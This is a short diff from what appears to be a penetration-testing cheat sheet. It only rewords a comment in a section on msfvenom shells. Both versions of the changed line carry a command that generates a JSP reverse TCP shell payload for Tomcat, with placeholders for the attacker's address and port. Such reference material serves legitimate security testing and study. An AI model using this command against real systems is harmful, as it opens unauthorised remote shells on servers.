@@ -166,7 +166,7 @@ https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 ## msfvenom shells
 **JSP Java Meterpreter Reverse TCP**
 ```sh
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #content management system TomCat 
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 
 ```
 **EXE**
 ```sh
